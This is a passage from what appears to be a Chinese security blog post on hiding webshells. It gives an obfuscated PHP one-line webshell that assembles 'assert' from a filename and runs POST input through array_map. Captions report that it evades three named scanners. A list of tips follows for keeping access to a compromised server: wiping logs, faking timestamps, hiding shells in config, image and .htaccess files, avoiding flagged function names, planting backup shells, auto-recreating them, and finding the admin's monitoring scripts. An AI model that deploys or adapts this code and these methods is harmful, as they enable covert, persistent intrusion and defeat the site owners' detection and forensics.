</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>functiondownloadFile</span><span class=p>(</span><span class=nv>$url</span><span class=p>,</span><span class=nv>$x</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$ary</span> <span class=o>=</span> <span class=nx>parse_url</span><span class=p>(</span><span class=nv>$url</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$file</span> <span class=o>=</span> <span class=nx>basename</span><span class=p>(</span><span class=nv>$ary</span><span class=p>[</span><span class=s1>&#39;path&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$ext</span> <span class=o>=</span> <span class=nx>explode</span><span class=p>(</span><span class=s1>&#39;.&#39;</span><span class=p>,</span><span class=nv>$file</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// assert 
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$exec1</span><span class=o>=</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$ext</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=mi>3</span><span class=p>,</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$exec2</span><span class=o>=</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$ext</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=mi>5</span><span class=p>,</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$exec3</span><span class=o>=</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$ext</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=mi>5</span><span class=p>,</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$exec4</span><span class=o>=</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$ext</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=mi>4</span><span class=p>,</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$exec5</span><span class=o>=</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$ext</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=mi>7</span><span class=p>,</span><span class=mi>2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$as</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$exec1</span> <span class=o>.</span> <span class=nv>$exec2</span> <span class=o>.</span> <span class=nv>$exec3</span> <span class=o>.</span> <span class=nv>$exec4</span> <span class=o>.</span> <span class=nv>$exec5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$as</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$x</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$as</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;x&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$s</span> <span class=o>=</span> <span class=nx>downloadFile</span><span class=p>(</span><span class=s1>&#39;http://www.baidu.com/asdaesfrtafga.txt&#39;</span><span class=p>,</span><span class=nv>$a</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$b</span> <span class=o>=</span> <span class=nv>$s</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nv>$c</span> <span class=o>=</span> <span class=nv>$s</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=nx>array_map</span><span class=p>(</span><span class=nv>$b</span><span class=p>,</span><span class=k>array</span><span class=p>(</span><span class=nv>$c</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=../../../../svg/loading.min.svg data-src=../../../../posts/security/web-security/hide-your-webshell/ex_16_hu6b13db84172005f67aad3a46a58a5a68_28899_845x581_resize_q75_h2_box_3.webp alt=/posts/security/web-security/hide-your-webshell/ex_16_hu6b13db84172005f67aad3a46a58a5a68_28899_845x581_resize_q75_h2_box_3.webp title=免杀></p><p>再试试其他免杀工具。</p><p>WebShellKiller：</p><p><img class=lazyload src=../../../../svg/loading.min.svg data-src=../../../../posts/security/web-security/hide-your-webshell/ex_17_hu4f310e46a11473291d0bace3bca4e647_49036_740x520_resize_q75_h2_box_3.webp alt=/posts/security/web-security/hide-your-webshell/ex_17_hu4f310e46a11473291d0bace3bca4e647_49036_740x520_resize_q75_h2_box_3.webp title=WebShellKiller></p><p>安全狗：</p><p><img class=lazyload src=../../../../svg/loading.min.svg data-src=../../../../posts/security/web-security/hide-your-webshell/ex_18_hu68a1b2dadde3adf5d601fa990f392b41_32502_902x602_resize_q75_h2_box_3.webp alt=/posts/security/web-security/hide-your-webshell/ex_18_hu68a1b2dadde3adf5d601fa990f392b41_32502_902x602_resize_q75_h2_box_3.webp title=安全狗></p><p>微步云沙箱：</p><p><img class=lazyload src=../../../../svg/loading.min.svg data-src=../../../../posts/security/web-security/hide-your-webshell/ex_19_hua5ac026cb9960f669926a899600388ff_53882_1004x568_resize_q75_h2_box_3.webp alt=/posts/security/web-security/hide-your-webshell/ex_19_hua5ac026cb9960f669926a899600388ff_53882_1004x568_resize_q75_h2_box_3.webp title=微步云沙箱></p><p>再试试可不可以连接没有问题，完美！！</p><p><img class=lazyload src=../../../../svg/loading.min.svg data-src=../../../../posts/security/web-security/hide-your-webshell/ex_20_hu4698517c26c830e386e3d43086c2a553_27891_1024x633_resize_q75_h2_box_3.webp alt=/posts/security/web-security/hide-your-webshell/ex_20_hu4698517c26c830e386e3d43086c2a553_27891_1024x633_resize_q75_h2_box_3.webp title=菜刀></p><h2 id=更好的隐藏webshell一些建议>更好的隐藏webshell一些建议</h2><ol><li><p>拿到权限以后,把网站日志中的所有关于webshell的访问记录和渗透时造成的一些网站报错记录全部删除</p></li><li><p>把webshell的属性时间改为和同目录文件相同的时间戳,比如Linux中的touch就是非常好的工具</p></li><li><p>目录层级越深越好,平时网站不出问题的话,一般四五级目录很少会被注意到,尽量藏在那些程序员和管理员都不会经常光顾的目录中比如:第三方工具的一些插件目录,主题目录,编辑器的图片目录以及一些临时目录</p></li><li><p>利用php.ini 配置文件隐藏webshell,把webshell的路径加入到配置文件中</p></li><li><p>尝试利用静态文件隐藏一句话,然后用.htaccess 规则进行解析</p></li><li><p>上传个精心构造的图片马,然后再到另一个不起眼的正常的网站脚本文件中去包含这个图片马</p></li><li><p>靠谱的方法就是直接把一句话插到正常的网站脚本文件里面,当然最好是在一个不起眼的地方,比如:函数库文件,配置文件里面等等,以及那些不需要经常改动的文件</p></li><li><p>如果有可能的话,还是审计下目标的代码,然后想办法在正常的代码中构造执行我们自己的webshell,即在原生代码中执行webshell</p></li><li><p>webshell里面尽量不要用类似eval这种过于敏感的特征,因为awk一句话就能查出来,除了eval,还有,比如:exec,system,passthru,shell_exec,assert这些函数都最好不要用,你可以尝试写个自定义函数,不仅能在一定程度上延长webshell的存活时间也加大了管理员的查找难度,也可以躲避一些功能比较简陋waf查杀,此外,我们也可以使用一些类似:call_user_func,call_user_func_array,诸如此类的回调函数特性来构造我们的webshell,即伪造正常的函数调用</p></li><li><p>webshell的名字千万不要太扎眼,比如:hack.php,sb.php,x.php这样的名字严禁出现……,在给webshell起名的时候尽量跟当前目录的,其他文件的名字相似度高一点,这样相对容易混淆视听,比如:目录中有个叫new.php的文件,那你就起个news.php</p></li><li><p>如果是大马的话,尽量把里面的一些注释和作者信息全部都去掉,比如intitle字段中的版本信息等等,用任何大马之前最好先好好的读几遍代码,把里面的shell箱子地址全部去掉推荐用开源的大马,然后自己拿过来仔细修改,记住,我们的webshell尽量不要用加密,因为加密并不能很好的解决waf问题,还有,大马中一般都会有个pass或者password字符,建议把这些敏感字段全部换成别的,因为利用这样的字符基本一句话就能定位到</p></li><li><p>养成一个好习惯,为了防止权限很快丢失,最好再同时上传几个备用webshell,注意,每个webshell的路径和名字千万不要都一样更不要在同一个目录下,多跳几层,记住,确定shell正常访问就可以了,不用再去尝试访问看看解析是否正常,因为这样就会在日志中留下记录,容易被查到</p></li><li><p>当然,如果在拿到服务器权限以后,也可以自己写个脚本每隔一段时间检测下自己的webshell是否还存在,不存在就创建</p></li><li><p>在有权限的情况,看看管理员是否写的有动态webshell监测脚本,务必把脚本找出来,crontab一般都能看见了</p></li></ol></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2023-04-11&nbsp;<a class=git-hash href=https://github.com/zu1k/blog/commit/78a4de2a7ebece1069b8d303d5c3c6521dde11f6 target=_blank title="commit by zu1k(i@zu1k.com) 78a4de2a7ebece1069b8d303d5c3c6521dde11f6: havoc">
<i class=icon-hashtag></i>78a4de2</a></span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=../../../../posts/security/web-security/hide-your-webshell/index.md target=_blank>阅读原始文档</a></span></div><div class=post-info-share><span><a title="分享到 Twitter" data-sharer=twitter data-url=https://zu1k.com/posts/security/web-security/hide-your-webshell/ data-title=如何优雅的隐藏你的Webshell data-via=zu1k_ data-hashtags=WebShell><i class=icon-twitter></i>
</a><a title="分享到 Tumblr" data-sharer=tumblr data-url=https://zu1k.com/posts/security/web-security/hide-your-webshell/ data-title=如何优雅的隐藏你的Webshell data-tags=WebShell><i class=icon-tumblr></i>
</a><a title="分享到 Evernote" data-sharer=evernote data-url=https://zu1k.com/posts/security/web-security/hide-your-webshell/ data-title=如何优雅的隐藏你的Webshell><i class=icon-evernote></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class=icon-tags></i>&nbsp;<a href=../../../../tags/webshell/>WebShell</a></section><section><span><a onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=../../../../>主页</a></span></section></div><div class=post-nav><a href=../../../../posts/coding/nali-golang/ class=prev rel=prev title="Nali IP地理信息和CDN服务商查询"><i class=icon-angle-left></i>Nali IP地理信息和CDN服务商查询</a>
<a href=../../../../posts/security/reverse/golang-reverse/ class=next rel=next title=Golang逆向资料>Golang逆向资料<i class=icon-angle-right></i></a></div></div><div id=comments><div class=giscus id=giscus></div><noscript>Please enable JavaScript to view the comments powered by <a href=https://giscus.app/zh-CN>Giscus</a>.</noscript></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line><i class=icon-copyright></i><span itemprop=copyrightYear>2017 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=https://zu1k.com target=_blank>zu1k</a></span>&nbsp;|&nbsp;<span class=license><a rel="license external nofollow noopener noreffer" href=https://creativecommons.org/licenses/by-nc/4.0/ target=_blank>CC BY-NC 4.0</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class=icon-up></i>
</a><a id=view-comments class=fixed-button title=查看评论><i class=icon-comment></i></a></div><link rel=stylesheet href=../../../../lib/lightgallery/lightgallery.min.css><script type=text/javascript src=../../../../lib/smooth-scroll/smooth-scroll.min.js></script><script type=text/javascript src=../../../../lib/autocomplete/autocomplete.min.js></script><script type=text/javascript src=../../../../lib/fuse/fuse.min.js></script><script type=text/javascript src=../../../../lib/lazysizes/lazysizes.min.js></script><script type=text/javascript src=../../../../lib/instant-page/5.1.0.min.js></script><script type=text/javascript src=../../../../lib/lightgallery/lightgallery.min.js></script><script type=text/javascript src=../../../../lib/lightgallery/lg-thumbnail.min.js></script><script type=text/javascript src=../../../../lib/lightgallery/lg-zoom.min.js></script><script type=text/javascript src=../../../../lib/clipboard/clipboard.min.js></script><script type=text/javascript src=../../../../lib/sharer/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:100},comment:{giscus:{category:"Comments",categoryid:"DIC_kwDOEfJ9084CA02V",enable:!0,mapping:"og:title",repo:"zu1k/blog",repoid:"MDEwOlJlcG9zaXRvcnkzMDExMDQ1OTU="}},lightGallery:{actualSize:!1,exThumbImage:"data-thumbnail",hideBarsDelay:2e3,selector:".lightgallery",speed:400,thumbContHeight:80,thumbWidth:80,thumbnail:!0},search:{distance:100,findAllMatches:!1,fuseIndexURL:"/index.json",highlightTag:"em",ignoreFieldNorm:!1,ignoreLocation:!0,isCaseSensitive:!1,location:0,maxResultLength:10,minMatchCharLength:2,noResultsFound:"没有找到结果",snippetLength:50,threshold:.1,type:"fuse",useExtendedSearch:!1}}</script><script type=text/javascript src=../../../../js/theme.min.js></script></body></html>